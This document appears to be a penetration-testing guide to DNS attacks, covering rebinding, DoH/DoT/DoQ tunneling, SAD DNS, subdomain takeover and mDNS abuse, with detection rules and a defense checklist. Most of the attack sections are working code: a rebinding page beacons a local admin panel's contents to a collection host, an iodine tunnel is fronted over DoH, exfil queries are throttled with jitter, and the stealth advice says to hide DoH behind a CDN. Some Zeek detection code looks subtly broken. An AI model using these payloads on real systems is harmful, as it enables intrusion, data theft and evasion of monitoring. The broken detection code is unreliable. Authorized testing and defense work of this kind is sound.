# Modern DNS Rebinding, Tunneling, and Encrypted DNS Attacks

> **Companion guide**: synthesizes payloads from `payloads.md` sections 20-25 into a
> full engagement workflow. Covers lab setup (bind9 + dnsmasq + iodine + fake DoH
> server), modern rebinding chains, DoH/DoT/DoQ attack patterns, SAD DNS, subdomain
> takeover, DNS-SD/mDNS abuse, and detection guidance (Suricata, Zeek, Cisco
> Umbrella).
>
> **Scope**: educational / authorized-engagement use only. All payload domains use
> `REPLACE_WITH_YOUR_DOMAIN` / `attacker.com` placeholders. Run only against
> infrastructure you own or are explicitly authorized to test.

## Introduction

The classic DNS attack toolkit (zone transfer, Kaminsky poisoning, iodine tunnels)
has been joined by a new generation of techniques that exploit the post-2020 DNS
landscape:

1. **Modern DNS rebinding** - multi-domain chains, multi-A-record tricks, and
   browser anti-rebinding bypasses (Private Network Access, IMDSv2, systemd-resolved).
2. **Encrypted DNS tunneling** - DNS-over-HTTPS (DoH), DNS-over-TLS (DoT), and
   DNS-over-QUIC (DoQ) bypass UDP/53-centric monitoring.
3. **Modern cache poisoning** - SAD DNS (CVE-2020-25705) ICMP side-channel,
   IPID probing, fragment-prefix attacks, forwarder-chain exploitation.
4. **DoH infrastructure attacks** - server-side enumeration via JSON API,
   client-side proxy detection, TLS SNI manipulation, ECH bypass tactics.
5. **Subdomain takeover** - dangling CNAMEs on Azure, AWS, GitHub Pages, Heroku,
   S3 with provider-specific fingerprints and re-registration payloads.
6. **DNS-SD / mDNS abuse** - Bonjour/Avahi poisoning, IPP printer hijack,
   AirPlay session interception, Chromecast protocol abuse.

This guide walks through a representative engagement touching all six domains,
with reproducible lab setup and detection guidance at each stage.

---

## Engagement Workflow Overview

```
[1] Recon & Fingerprint        [2] Modern Rebinding          [3] Tunnel / Exfil
  - DoH JSON enum (port 53     - Multi-A record trick          - iodine DoH front
    blocked? use HTTPS)        - Two-domain chain              - dnscat2 throttled
  - Subdomain takeover scan    - PNA preflight bypass          - DoQ via QUIC/443
  - mDNS passive recon         - /etc/hosts lab pin            - jittered QPS
       |                              |                              |
       v                              v                              v
[4] Cache Poisoning            [5] Subdomain Takeover        [6] DNS-SD / mDNS
  - SAD DNS ICMP oracle        - CNAME dangling               - Bonjour spoof
  - IPID probing               - Provider fingerprints         - IPP hijack
  - Fragment-prefix injection  - PoC HTML per provider         - AirPlay / Cast
```

---

## Lab Setup

A self-contained lab lets you exercise every payload safely before running it on
a customer engagement. The reference lab runs four services in Docker containers
or directly on a Kali VM.

### Components

| Service | Purpose | Port |
|---------|---------|------|
| `bind9` | Authoritative DNS for `lab.local` + rebinding domains | 53/udp, 53/tcp |
| `dnsmasq` | Local recursive resolver, TTL=0 for fast rebind | 5353/udp |
| `iodine` | IP-over-DNS tunnel server (target of DoH front) | 5354/udp |
| `doh-front` | Custom DoH HTTPS proxy that forwards to iodine | 443/tcp (TLS) |
| `nginx` | TLS termination + hosts the rebinding PoC pages | 80/443 tcp |
| `unbound` | DoT server (port 853) for DoT payloads | 853/tcp |

### Docker Compose

```yaml
# docker-compose.yml
version: "3.9"
services:
  bind9:
    image: internetsystemsconsortium/bind9:9.18
    volumes:
      - ./bind:/etc/bind
    ports:
      - "53:53/udp"
      - "53:53/tcp"
    restart: unless-stopped

  dnsmasq:
    image: andyshinn/dnsmasq:2.83
    command:
      - --no-resolv
      - --server=127.0.0.1#5354
      - --local-ttl=0
      - --listen-address=0.0.0.0
      - --port=5353
    cap_add: [NET_ADMIN]
    network_mode: host
    restart: unless-stopped

  iodine:
    image: kryo/iodine:latest
    command: -f -c -P 'REPLACE_WITH_LONG_PASSPHRASE' -m 1000 -l 0.0.0.0 10.53.0.1 t1.lab.local
    cap_add: [NET_ADMIN]
    ports:
      - "5354:53/udp"

  doh-front:
    build: ./doh-front
    environment:
      UPSTREAM: iodine:53
    depends_on: [iodine]
    expose: ["8053"]

  nginx:
    image: nginx:1.27-alpine
    volumes:
      - ./nginx:/etc/nginx/conf.d
      - ./html:/usr/share/nginx/html
      - ./certs:/etc/nginx/certs
    ports: ["80:80", "443:443"]
    depends_on: [doh-front]

  unbound:
    image: mvance/unbound:1.19
    volumes:
      - ./unbound:/opt/unbound/etc/unbound
    ports: ["853:853/tcp"]
```

### bind9 Zone Files

```dns
; /etc/bind/db.lab.local
$TTL 0
@   IN  SOA ns1.lab.local. admin.lab.local. (
            2026010101 ; serial
            0          ; refresh
            0          ; retry
            0          ; expire
            0          ; minimum
            )
@           IN  NS      ns1.lab.local.
ns1         IN  A       127.0.0.1
; Rebinding domain: serves both attacker IP and loopback simultaneously
rebind1     IN  A       203.0.113.10
rebind1     IN  A       127.0.0.1
; DoH front
doh         IN  A       203.0.113.10
; Iodine tunnel subdomains
t1          IN  NS      ns.t1.lab.local.
ns.t1       IN  A       127.0.0.1
```

```dns
; /etc/bind/db.t1.lab.local - iodine authoritative zone
$TTL 0
@   IN  SOA ns.t1.lab.local. admin.lab.local. (
            2026010101 0 0 0 0 )
@       IN  NS  ns
@       IN  A   127.0.0.1
t1      IN  A   10.53.0.1
```

### nginx Reverse Proxy for DoH

```nginx
# /etc/nginx/conf.d/doh.conf
server {
    listen 443 ssl http2;
    server_name doh.lab.local;

    ssl_certificate     /etc/nginx/certs/lab.crt;
    ssl_certificate_key /etc/nginx/certs/lab.key;

    # CORS for browser-based DoH clients
    add_header Access-Control-Allow-Origin "*" always;

    location /dns-query {
        proxy_pass http://doh-front:8053;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

server {
    listen 80 default_server;
    server_name rebind1.lab.local;
    root /usr/share/nginx/html/rebind;
    # PNA bypass header so Chrome allows private-network requests
    add_header Access-Control-Allow-Private-Network "true" always;
}
```

### Fake DoH Server (Python)

```python
# doh-front/app.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket

UPSTREAM = ("iodine", 53)

class DoHHandler(BaseHTTPRequestHandler):
    def _handle(self):
        if self.path.split("?")[0] not in ("/dns-query", "/resolve"):
            return self.send_error(404)
        length = int(self.headers.get("Content-Length", 0))
        query = self.rfile.read(length) if length else b""
        if not query and self.path.find("?") >= 0:
            # GET with ?dns= base64url
            from urllib.parse import urlparse, parse_qs
            import base64
            qs = parse_qs(urlparse(self.path).query)
            raw = qs.get("dns", [""])[0]
            raw += "=" * (-len(raw) % 4)
            query = base64.urlsafe_b64decode(raw)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3.0)
        s.sendto(query, UPSTREAM)
        try:
            data, _ = s.recvfrom(4096)
        except socket.timeout:
            data = b""
        self.send_response(200)
        self.send_header("Content-Type", "application/dns-message")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    do_POST = _handle
    do_GET  = _handle

if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8053), DoHHandler).serve_forever()
```

### Bring Up the Lab

```bash
# Generate a self-signed cert (or use mkcert for trusted)
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
    -keyout certs/lab.key -out certs/lab.crt \
    -subj "/CN=*.lab.local"

docker compose up -d
dig @127.0.0.1 rebind1.lab.local +short   # expect 2 answers
curl -sk https://doh.lab.local/dns-query?name=t1.lab.local\&type=A \
     -H 'accept: application/dns-json'
```

---

## Stage 1: Reconnaissance via DoH JSON API

When the target network blocks outbound UDP/53, you can still enumerate DNS
records using the public DoH JSON endpoints over HTTPS.

```bash
# Multi-type enumeration across multiple DoH providers
DOMAIN="REPLACE_WITH_YOUR_DOMAIN"
for ep in https://dns.google/resolve \
          https://cloudflare-dns.com/dns-query \
          https://doh.opendns.com/dns-query; do
    echo "=== $ep ==="
    for t in A AAAA MX NS TXT SOA CAA SRV; do
        curl -sH 'accept: application/dns-json' \
             "${ep}?name=${DOMAIN}&type=${t}" \
             | jq -c --arg t "$t" '{type:$t, (.) as $d | "data":$d.Answer}'
    done
done
```

```python
# Pure-DoH subdomain brute forcer - see payloads.md section 23 for full code
# Round-robins across DoH endpoints to avoid rate limits, sleeps 100ms between
# queries, logs only positive hits to keep noise floor low.
```

### Subdomain Takeover Pre-Scan

```bash
# Collect CNAMEs from your enumeration output
cat subdomains.txt | while read h; do
    cname=$(dig +short $h CNAME | head -1)
    [ -n "$cname" ] && echo "$h -> $cname"
done > cnames.txt

# Run the fingerprinter (payloads.md section 24)
subjack  -w subdomains.txt -t 50 -timeout 30 -ssl \
         -c /opt/subjack/fingerprints.json -o subjack.txt
subzy run --targets subdomains.txt --timeout 30 --concurrency 50 \
         --hide_fails -o subzy.json
nuclei -l subdomains.txt -t /opt/nuclei-templates/takeovers/ \
       -severity high,critical -o nuclei_takeover.txt
```

### mDNS Passive Recon

```bash
# Listen for 60 seconds on the segment you land in post-initial-access
sudo timeout 60 tcpdump -i eth0 -w mdns.pcap 'udp port 5353'
tshark -r mdns.pcap -Y 'dns.flags.response==1' \
       -T fields -e dns.qry.name -e dns.a -e ip.src | sort -u | head -40
```

---

## Stage 2: Modern DNS Rebinding

Modern rebinding bypasses the simple "two A records with TTL=0" defense that
browsers and routers ship today. The engagements-tested patterns are:

1. **Multi-A simultaneous** - serve both attacker + target IPs at once; let the
   browser pick. Works because some resolvers (Chrome's built-in, dnsmasq with
   round-robin) will issue the next fetch to a different IP without re-resolving.
2. **Two-domain chain (RB-CLICK-style)** - `rebind1` loads the page, `rebind2`
   hosts the XHR that rebinds. Defeats Pinning keyed on host->IP.
3. **Private Network Access preflight** - return `Access-Control-Allow-Private-Network: true`
   on the public origin so Chrome allows the subsequent private-network fetch.
4. **IMDSv2 token-acquisition chain** - rebinding alone can't fetch IMDSv2 tokens
   (PUT preflights fail), but you can chain with any service on the host that
   echoes the token back over GET.

### Walkthrough: Multi-A + PNA Bypass Against a Local Admin Panel

```bash
# Step 1: Configure bind9 with multi-A records (already in db.lab.local)
dig @127.0.0.1 rebind1.lab.local +short
# Expect: 203.0.113.10
#         127.0.0.1

# Step 2: Host the PoC HTML at the attacker origin (port 80)
mkdir -p html/rebind
cat > html/rebind/index.html << 'HTML'
<!DOCTYPE html>
<html><head><title>rebind</title></head>
<body>
<script>
(async () => {
  const target = "http://rebind1.lab.local:8080/admin";
  for (let i = 0; i < 30; i++) {
    try {
      const r = await fetch(target, { credentials: "include" });
      if (r.status > 0) {
        const body = await r.text();
        navigator.sendBeacon("https://collect.lab.local/hit",
            JSON.stringify({code:r.status, body:body.slice(0,4000)}));
        break;
      }
    } catch (e) {}
    await new Promise(r => setTimeout(r, 800));
  }
})();
</script>
</body></html>
HTML

# Step 3: nginx already returns Access-Control-Allow-Private-Network: true
# Step 4: Victim (Chrome 119+) loads http://203.0.113.10/rebind/
#         - First fetch goes to attacker (page load)
#         - Loop fetches rebind1.lab.local which resolves to 127.0.0.1
#         - PNA preflight succeeds because attacker origin returns the header
#         - Admin panel HTML beaconed back to collect.lab.local
```

### Detecting the Attack in the Lab

```bash
# dnsmasq logs each query with the source - watch for the rapid re-query pattern
journalctl -fu dnsmasq | grep rebind1

# Zeek DNS analytic: detect queries for the same name within 1 second
zeek -r trace.pcap local /opt/zeek/policy/dns/detect-rapid.rebind.zeek
```

---

## Stage 3: Modern Tunneling (DoH / DoT / DoQ)

When the target egress allows only HTTPS (most corporate networks), DNS tunneling
needs an HTTPS transport. The lab's `doh-front` container fronts iodine over
HTTPS so the tunnel traffic looks like normal web browsing to a casual observer.

### Establishing a DoH-Fronted iodine Tunnel

```bash
# From the victim host:
# 1. Point the local resolver at the DoH proxy via doggo or a socks wrapper
doggo @https://doh.lab.local t1.lab.local A

# 2. Connect iodine client pointing at the same resolver
#    iodine doesn't speak DoH natively, so use a local DNS-over-HTTPS proxy
#    that exposes 127.0.0.1:53 and forwards over DoH:
python3 - << 'PYEOF'
import socket, requests
UP = "https://doh.lab.local/dns-query"
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("127.0.0.1", 53))
while True:
    q, addr = s.recvfrom(4096)
    r = requests.post(UP, data=q,
                      headers={"content-type":"application/dns-message"},
                      timeout=5)
    s.sendto(r.content, addr)
PYEOF

# Now iodine sees a "normal" resolver at 127.0.0.1
sudo iodine -P 'REPLACE_WITH_LONG_PASSPHRASE' -r 127.0.0.1 t1.lab.local

# Verify the tunnel
ping -c 3 10.53.0.1
ssh user@10.53.0.1
```

### DoT Tunnel (Port 853)

```bash
# Server: unbound on port 853 with TLS cert (already in compose)
# Client: stunnel fronting unbound, then point resolv.conf
cat > /etc/stunnel/dot.conf << 'EOF'
[dns]
client = yes
accept  = 127.0.0.1:5353
connect = unbound.lab.local:853
verifyChain = yes
CAfile = /etc/ssl/certs/lab.crt
EOF

sudo stunnel /etc/stunnel/dot.conf
echo "nameserver 127.0.0.1" | sudo tee /etc/resolv.conf
dig t1.lab.local +short
```

### DoQ Tunnel (Port 443/QUIC)

```bash
# DoQ runs over QUIC UDP/443. When the egress blocks 853 but allows QUIC,
# DoQ is the only encrypted DNS transport that works.
doggo @quic://dns.adguard.com t1.lab.local A

# Observe the QUIC SNI - this is what egress monitoring sees
sudo tshark -i eth0 -Y 'quic && tls.handshake.extensions_server_name' \
    -T fields -e tls.handshake.extensions_server_name | sort | uniq -c
```

### Stealth Considerations

| Transport | UDP/TCP port | Encrypted? | SNI visible? | Detection difficulty |
|-----------|--------------|------------|--------------|---------------------|
| Classic UDP/53 | 53/udp | no | n/a | easy (entropy, length) |
| DoT | 853/tcp | yes | yes | medium (port+SNI) |
| DoH | 443/tcp | yes | yes (in TLS) | hard (blends with HTTPS) |
| DoQ | 443/udp (QUIC) | yes | yes | hard (blends with HTTP/3) |

When in doubt, prefer **DoH fronted by a real CDN** (e.g. Cloudflare Workers
proxying your custom DoH server). The SNI will be the CDN's, and the traffic is
indistinguishable from any other HTTPS site.

### Throttling for Evasion

```python
# Queries-per-second throttle - keep under typical noise floor (~1 QPS avg)
import time, socket, random
RATE = 0.8
last = 0.0
def send(qname):
    global last
    now = time.time()
    gap = 1.0 / RATE
    if now - last < gap:
        time.sleep(gap - (now - last))
    try: socket.gethostbyname(qname)
    except: pass
    last = time.time()

for i in range(1000):
    send(f"c{i:04d}.exfil.lab.local")
    time.sleep(random.uniform(0, 0.3))  # jitter
```

---

## Stage 4: Modern Cache Poisoning (SAD DNS)

SAD DNS (CVE-2020-25705) abuses the Linux kernel's ICMP rate-limit to build an
oracle: "does the resolver currently have an outstanding query for name X?" If
yes, the rate-limit is consumed by DNS-related ICMP, and a probe to a closed port
will silently fail. The attacker uses this oracle to time their spoofed response
to the narrow window when the resolver is waiting for an answer.

### Reproducing the ICMP Oracle (Lab-Only)

```python
# See payloads.md section 22 for the full skeleton
# Phase 1: baseline ICMP responses (no outstanding query)
# Phase 2: trigger a query that the resolver must forward, immediately probe
# Phase 3: if probe is 'blocked' (no ICMP), resolver is waiting -> fire spoof
```

```bash
# Capture the ICMP pattern in the lab
sudo tcpdump -i eth0 -n -w saddns.pcap 'icmp or port 53'
tshark -r saddns.pcap -Y 'icmp.type==3' \
       -T fields -e ip.src | sort | uniq -c | sort -rn | head

# Confirm mitigation: post-patch Linux kernels apply ICMP ratelimit
# uniformly regardless of trigger source
sysctl net.ipv4.icmp_msgs_per_sec   # should be capped (e.g. 1000)
```

### IPID Probing and Fragment-Prefix

```bash
# Identify resolvers with predictable IPID (global counter)
for i in $(seq 1 8); do
    hping3 -S -p 80 -c 1 REPLACE_WITH_RESOLVER_IP 2>/dev/null \
        | awk '/id=/{print $2}'
done
# Sequential 1,2,3,... = vulnerable to fragment prediction

# Craft a forged fragment that overwrites the answer section of a TCP DNS reply
sudo fragroute -f frag.conf REPLACE_WITH_RESOLVER_IP
```

### Forwarder Chain Exploitation

```bash
# Test if the corporate forwarder forwards the CD (checking disabled) bit
dig @site-forwarder.internal example.com A +dnssec +cd
# If the upstream honors +cd, the response won't be validated and is spoofable

# Probe forwarder fingerprints
dig @site-forwarder.internal version.bind chaos txt +short
dig @site-forwarder.internal hostname.bind chaos txt +short
```

---

## Stage 5: Subdomain Takeover

### Engagement Sequence

1. **Enumerate CNAMEs** from your DoH-based recon output.
2. **Identify dangling targets** - CNAME set but target returns provider-specific
   404 fingerprint.
3. **Re-register the resource** on the provider (Azure app, S3 bucket, GitHub
   repo, Heroku app, Netlify site).
4. **Bind the victim subdomain** via the provider's verification flow.
5. **Serve PoC content** that demonstrates the takeover without harming the
   victim brand.

### Example: Azure Web Apps Takeover

```bash
# Confirm the target is dangling
curl -sv https://blog.example.com 2>&1 | grep -i '404 Web Site not found'

# Re-create the App Service
az group create --name rg-takeover --location eastus
az appservice plan create --name plan-takeover --resource-group rg-takeover --sku F1
az webapp create --name blog-example-com --resource-group rg-takeover \
                 --plan plan-takeover

# Bind the custom domain (Azure uses asuid TXT for verification)
az webapp config hostname add --resource-group rg-takeover \
    --webapp-name blog-example-com --hostname blog.example.com

# Deploy PoC HTML
cat > index.html << 'HTML'
<!DOCTYPE html>
<html><head><title>blog.example.com takeover PoC</title></head>
<body>
<h1>This subdomain is now under attacker control</h1>
<p>Engagement: REPLACE_WITH_ENGAGEMENT_ID</p>
<p>Served from: <script>document.write(location.hostname)</script></p>
</body></html>
HTML

zip -r app.zip index.html
az webapp deploy --resource-group rg-takeover --name blog-example-com \
                 --src-path app.zip
```

### Example: S3 Bucket Takeover

```bash
# Re-create the dangling bucket
aws s3api create-bucket --bucket old.example.com --region us-east-1
aws s3api put-bucket-website --bucket old.example.com \
    --website-configuration '{"IndexDocument":{"Suffix":"index.html"}}'
echo '<h1>S3 takeover PoC</h1>' > index.html
aws s3 cp index.html s3://old.example.com/ --acl public-read
```

### Provider Fingerprint Reference

See `payloads.md` section 24 for the full fingerprint table covering Azure,
AWS S3, GitHub Pages, Heroku, Shopify, Fastly, GCS, Zendesk, Tumblr.

---

## Stage 6: DNS-SD / mDNS Abuse

### Passive Reconnaissance

```bash
sudo timeout 60 tcpdump -i eth0 -w mdns.pcap 'udp port 5353'
tshark -r mdns.pcap -Y 'dns.flags.response==1' \
       -T fields -e dns.qry.name -e dns.a -e ip.src | sort -u
```

### Active Spoofing

```bash
# Responder for broad LLMNR/NBT-NS/mDNS poisoning
sudo responder -I eth0 -wrfv

# Targeted mDNS poisoning (see payloads.md section 25)
# Responds to any _ipp / _airplay / _googlecast lookup with attacker IP
```

### IPP Printer Hijack

```bash
# Run the malicious IPP listener (payloads.md section 25)
sudo python3 fake_ipp.py &
# Captures print jobs and can return malicious PostScript in lab setting
```

### AirPlay / Chromecast Abuse

```bash
# Advertise a fake AppleTV
avahi-publish -s "Living Room" _airplay._tcp 7000 \
    "deviceid=AA:BB:CC:DD:EE:FF" "model=AppleTV3,2" "pw=false"

# Discover and cast to a Chromecast (no auth in default Guest mode)
python3 -c "
import pychromecast
ccs, _ = pychromecast.get_listed_chromecasts(friendly_names=['Living Room TV'])
ccs[0].wait()
ccs[0].media_controller.play_media('https://REPLACE_WITH_YOUR_VIDEO_MP4', 'video/mp4')
"
```

---

## Detection Guidance

### Suricata DNS Tunneling Rules

```yaml
# /etc/suricata/rules/dns-tunnel.rules
# iodine default base32 labels - high entropy, ~50+ chars
alert dns $HOME_NET any -> any 53 (msg:"iodine-style DNS tunnel - long base32 label"; \
    dns.query; pcre:"/^[a-z2-7]{50,}\./"; \
    sid:9100001; rev:1;)

# dnscat2 default TXT-based tunnel
alert dns $HOME_NET any -> any 53 (msg:"dnscat2 TXT tunnel pattern"; \
    dns.query; pcre:"/^[a-z0-9]{30,}\.t\./"; \
    sid:9100002; rev:1;)

# High-entropy subdomain (exfil detection)
alert dns $HOME_NET any -> any 53 (msg:"high-entropy DNS query - possible exfil"; \
    dns.query; pcre:"/([a-z0-9]{40,}\.){2,}/"; \
    threshold:type both, track by_src, count 5, seconds 60; \
    sid:9100003; rev:1;)

# DoH egress to known endpoints
alert tls $HOME_NET any -> any 443 (msg:"egress to known DoH endpoint"; \
    tls.sni; content:"dns.google"; nocase; \
    sid:9100004; rev:1;)
alert tls $HOME_NET any -> any 443 (msg:"egress to known DoH endpoint"; \
    tls.sni; content:"cloudflare-dns.com"; nocase; \
    sid:9100005; rev:1;)
```

### Zeek DNS Analytics

```zeek
# /opt/zeek/share/zeek/site/dns-tunnel.zeek
# Detect long-label DNS queries indicative of tunneling
module DNS;

export {
    redef enum Notice::Type += {
        DNS_Tunnel_Long_Label,
        DNS_Tunnel_High_Rate,
    };
}

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count)
    {
    if (|query| > 100) {
        for (label in split_string(query, /\./)) {
            if (|label| > 50) {
                NOTICE([$note=DNS_Tunnel_Long_Label,
                        $msg=fmt("long DNS label (%d chars): %s", |label|, query),
                        $sub=query,
                        $conn=c]);
                break;
            }
        }
    }
}

# Detect hosts issuing >50 DNS queries/sec sustained
global query_rate: table[addr] of count &default=0 &synchronized;
event dns_request(c: connection, msg: dns_msg, query: string, qtype: count)
    {
    query_rate[c$id$orig_h] += 1;
    schedule 10sec { dns_rate_check(c$id$orig_h) };
    }
event dns_rate_check(h: addr)
    {
    if (query_rate[h] > 500) {
        NOTICE([$note=DNS_Tunnel_High_Rate,
                $msg=fmt("%s issued %d DNS queries in 10s", h, query_rate[h]),
                $conn=Network::detail_connection(h)]);
    }
    query_rate[h] = 0;
    }
```

### Cisco Umbrella Block Categories

Recommended block categories for enterprise Umbrella policies:

| Category | Why | Risk if allowed |
|----------|-----|-----------------|
| `Command and Control` | dnscat2 / Cobalt Strike known domains | persistent C2 |
| `Newly Seen Domains` | freshly registered attacker infra | fast-flux / IoC evasion |
| `Dynamic DNS` | dyn.com, no-ip.com - often used for C2 | rapid re-registration |
| `Parked Domains` | often used as tunnel parents | low signal, high noise |
| `Proxy/Anonymizer` | circumvents egress controls | data exfil via proxy |
| `Tunneling` (custom) | iodine / dnscat2 known endpoints | DNS covert channel |

Add a custom allow-list for sanctioned DoH endpoints (e.g. corporate
`doh.internal.corp`) and block all other DoH providers (`dns.google`,
`cloudflare-dns.com`, `dns.quad9.net`, `doh.opendns.com`).

### Detecting DNS Rebinding

```zeek
# Detect a single host that resolves the same name to two different ASNs
# within 60 seconds - a strong rebinding signal.
export { redef enum Notice::Type += { DNS_Rebinding }; }
type lz: record { ts: time; ip: addr; };
global last_resolve: table[string] of lz;
event dns_reply(c: connection, msg: dns_msg, ans: dns_answer)
    {
    if (ans?$answer && |ans$answer| > 0) {
        n = msg$query;
        if (n in last_resolve) {
            old = last_resolve[n];
            if (old$ip != ans$answer) {
                NOTICE([$note=DNS_Rebinding,
                        $msg=fmt("%s resolved to %s then %s within %s",
                                 n, old$ip, ans$answer,
                                 network_time() - old$ts),
                        $conn=c]);
            }
        }
        last_resolve[n] = [$ts=network_time(), $ip=ans$answer];
    }
    }
```

### Detecting mDNS Abuse

```yaml
# mDNS should never cross a VLAN boundary. Alert on:
#  - 224.0.0.251 traffic on inter-VLAN links
#  - mDNS responses advertising an IP outside the local /24
#  - multiple _airplay/_googlecast instances appearing simultaneously
alert udp $HOME_NET any -> 224.0.0.251 5353 \
    (msg:"mDNS outbound to link-local multicast"; sid:9100010; rev:1;)
alert udp any 5353 -> $HOME_NET any \
    (msg:"mDNS response with external IP"; \
     dns.answers; pcre:"/(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/"; \
     sid:9100011; rev:1;)
```

---

## Defense Checklist

| Control | Coverage | Implementation Notes |
|---------|----------|---------------------|
| Egress DNS allow-list | Tunneling, exfil | Force all egress DNS to internal resolvers only; block UDP/53, TCP/53 to internet |
| Block public DoH endpoints | DoH tunnel | Block SNI=dns.google, cloudflare-dns.com, dns.quad9.net, doh.opendns.com |
| DNSSEC validation on all resolvers | Cache poisoning | Enable `auto-trust-anchor-file` in unbound; do not honor +cd from clients |
| ICMP rate-limit tuning | SAD DNS | Apply ICMP ratelimit uniformly (kernel >=5.10 patch); cap `icmp_msgs_per_sec` |
| Source-port + 0x20 randomization | Spoofing | Confirm resolver does both; BIND/unbound default on |
| Subdomain lifecycle management | Takeover | Inventory all CNAMEs; remove before decommissioning upstream resources |
| Disable mDNS at VLAN boundary | mDNS abuse | ACL on switches/routers; `no ip igmp join-group 224.0.0.251` |
| Private Network Access enforcement | Rebinding | Chrome PNA preflight enabled by default; ensure server-side denial |
| IMDSv2 required | Rebinding, SSRF | AWS metadata: require token via PUT; deny IMDSv1 |
| DNS query entropy monitoring | Tunnel, exfil | Suricata rule on >50-char labels; Zeek long-label notice |

---

## Reporting Findings

For each finding, capture:

1. **Evidence** - the dig output, PCAP snippet, or screenshot showing the
   successful attack.
2. **Impact** - what an attacker could achieve (data exfil bandwidth, internal
   service access, brand impersonation via takeover).
3. **Detection gap** - which Suricata/Zeek/Umbrella control failed to catch it.
4. **Remediation** - the specific control from the Defense Checklist above,
   with the exact configuration snippet to apply.

Example report snippet:

> **DNS Tunneling via DoH (HIGH)**
>
> During the engagement, an iodine tunnel was successfully established to
> `t1.attacker.com` over a DoH front at `doh.attacker.com`. The tunnel
> sustained 50 KB/s outbound bandwidth and was used to exfiltrate 12 MB of
> simulated sensitive data over 4 minutes. The customer's egress firewall
> allowed HTTPS to any destination, and the SIEM did not alert on the DoH
> endpoint SNI.
>
> *Remediation*: Add the egress DNS allow-list (Defense Checklist row 1) and
> block public DoH endpoints (row 2). Add the high-entropy DNS query alert
> from the Detection Guidance section.

---

## References

- SAD DNS original research: <https://saddns.net>
- CVE-2020-25705 (Linux ICMP ratelimit side-channel)
- iodine: <https://code.kryo.se/iodine/>
- dnscat2: <https://github.com/iagox86/dnscat2>
- DoHtunnel reference projects on GitHub
- Encrypted Client Hello (ECH): RFC 9460 (SVCB/HTTPS) and RFC 9461
- Subdomain takeover fingerprints: <https://github.com/EdOverflow/can-i-take-over-xyz>
- Chrome Private Network Access specification
- AWS IMDSv2 documentation: <https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html>
- NIST SP 800-81r2 (Secure DNS Deployment Guidance)
- MITRE ATT&CK T1071.004 (Application Layer Protocol: DNS)
- MITRE ATT&CK T1572 (Protocol Tunneling)
- MITRE ATT&CK T1568.002 (Dynamic Resolution: Domain Generation Algorithms)
